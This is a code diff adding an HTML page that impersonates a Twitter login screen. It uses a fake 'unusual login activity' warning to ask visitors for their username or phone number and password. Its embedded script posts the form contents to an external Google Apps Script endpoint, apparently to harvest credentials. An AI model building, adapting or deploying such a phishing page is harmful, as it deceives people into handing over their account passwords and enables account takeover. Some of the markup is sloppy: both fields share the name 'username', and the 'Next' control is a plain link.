@@ -1,0 +1,58 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <title>Log In | હardikસિંh ચૌhan </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-1ycn6IcaQQ40/MKBW2W4Rhis/DbILU74C1vSrLJxCq57o941Ym01SwNsOMqvEBFlcgUa6xLiPY/NS5R+E6ztJQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" type="text/css" href="twitter-log.css">
+    </head>
+<body>
+    
+    
+    <div class="container">
+    <div class="text"></div>
+    <div class="page">
+        <div class="title"> <img src="img/bird.PNG" height="50px" width="65px" align="top">            </div>
+        <form name="google-sheet">
+            <font color="white">
+            <h2>Log In</h2>
+                </font>
+        <h5>There was unusual login activity on your account. To help keep your account safe, please enter your phone number or username to verify that it’s you.
+</h5>
+   
+      
+        <input type="text" name="username" placeholder="Phone number or usrname">
+            <br>
+            <input type="password" name="username" placeholder="Password">
+                <a href="twitter-homepage.html" class="btn">Next</a>
+         
+        <div class="fblink">
+           
+        </div>
+        
+        
+        </form>    
+        </div>    
+    </div>
+    
+    <script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbzymNP0n5Csc2giVaUcaou_1jZcDIybL97wZNjPJX_yBGgm60i3KxfrmbsEVTwO7iyvpA/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+
+    
+    
+    
+    
+    
+    
+    </body>
+
+
+</html> 
